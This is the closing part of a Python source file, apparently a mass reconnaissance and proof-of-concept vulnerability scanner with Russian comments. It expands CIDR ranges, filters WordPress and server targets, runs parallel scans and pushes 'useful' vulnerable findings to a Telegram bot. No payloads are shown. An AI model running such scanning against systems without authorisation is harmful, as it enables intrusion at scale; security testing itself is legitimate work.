    log_section("SCAN COMPLETE")
    print(f"  {Colors.OKGREEN}Results saved to: {args.output_dir}{Colors.ENDC}")
    print(f"  {Colors.OKCYAN}Format: {args.format}{Colors.ENDC}")
    if poc_results:
        s = poc_results["summary"]
        print(f"  {Colors.OKGREEN}PoC Summary: {s['vulnerable']}V/{s['not_vulnerable']}NV/{s['unknown']}U/{s['error']}E/{s['blocked']}B/{s['skipped']}S (total {s['total']}){Colors.ENDC}")
    print()
    # Скан завершён полностью — промежуточный state больше не нужен
    clear_resume_state(args.output_dir, target)
    # Регистрация отчётов для Telegram-бота (/report)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    reg = {"summary": (poc_results or {}).get("summary", {}),
           "json": f"{args.output_dir}/recon_{target}_{ts}.json",
           "html": f"{args.output_dir}/recon_{target}_{ts}.html"}
    SCAN_REGISTRY[target] = reg
    # Telegram: полезные находки (vulnerable с confidence >= порога)
    if notifier and notifier.enabled:
        threshold = getattr(args, "notify_threshold", 70)
        found = [c for c in (poc_results or {}).get("main", [])
                 if isinstance(c, dict) and c.get("status") == "vulnerable"
                 and (c.get("confidence") or 0) >= threshold]
        if found:
            lines = [f"🚨 Полезные находки по {target} (confidence ≥ {threshold}):"]
            for c in found[:10]:
                lines.append(f"• {c.get('vulnerability')} — conf {c.get('confidence')}/100 "
                             f"({c.get('method')})")
            notifier.send("\n".join(lines))
    if notifier and notifier.enabled:
        if not args.notify_vulnerable or (poc_results and poc_results.get("summary", {}).get("vulnerable", 0) > 0):
            notifier.notify_scan_done(target, poc_results.get("summary") if poc_results else None,
                                      reg["json"])


def main():
    parser = build_arg_parser()
    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    # Список целей: одиночная или --targets (CSV/список) с фильтрами
    targets = []
    if args.target:
        targets = [args.target]
    elif args.targets:
        if args.only_site or args.only_wordpress or args.only_server:
            targets = select_targets_from_csv(args.targets, require_site=args.only_site,
                                              wordpress_only=args.only_wordpress,
                                              has_server=args.only_server)
        else:
            targets = parse_targets_file(args.targets)
        # CIDR разворачиваем в отдельные IP
        expanded = []
        for t in targets:
            if "/" in t:
                expanded.extend(expand_cidr(t))
            else:
                expanded.append(t)
        targets = expanded
        if not targets:
            log_error("No targets after parsing/filtering")
            sys.exit(1)
    else:
        parser.error("укажите цель или --targets FILE")

    notifier = TelegramNotifier(args.notify)
    if args.notify and not notifier.enabled:
        log_warning("[TG] --notify без BOT_TOKEN:CHAT_ID и без TG_BOT_TOKEN/TG_CHAT_ID — уведомления выключены")

    # Глобальный throttle: --rate-limit N (RPS) на все HTTP PoC-запросы
    if args.rate_limit:
        global RATE_LIMITER
        RATE_LIMITER = RateLimiter(max(1, args.rate_limit))
        log_info(f"[Rate] HTTP-запросы PoC ограничены {args.rate_limit}/сек")

    if len(targets) == 1:
        run_single_scan(args, targets[0], notifier)
        bot_command_loop(notifier)
        return

    log_section(f"BATCH MODE: {len(targets)} targets")
    n_workers = max(1, min(5, args.batch_threads))
    if n_workers > 1:
        log_info(f"[Batch] {n_workers} параллельных сканов")
    done_count = [0]
    lock_print = __import__("threading").Lock()

    def scan_one(t):
        try:
            run_single_scan(args, t, notifier)
        except KeyboardInterrupt:
            log_warning(f"[Batch] {t}: прервано пользователем")
        except Exception as e:
            log_error(f"[Batch] {t} failed: {e}")
            if notifier and notifier.enabled:
                notifier.send(f"❌ Скан {t} упал: {e}")
        finally:
            with lock_print:
                done_count[0] += 1
                log_info(f"[Batch] Готово {done_count[0]}/{len(targets)} ({t})")

    if n_workers == 1:
        for t in targets:
            scan_one(t)
    else:
        with ThreadPoolExecutor(max_workers=n_workers) as ex:
            futures = [ex.submit(scan_one, t) for t in targets]
            for f in as_completed(futures):
                f.result()
    log_success(f"[Batch] Done: {len(targets)} targets")
    bot_command_loop(notifier)

if __name__ == "__main__":
    main()
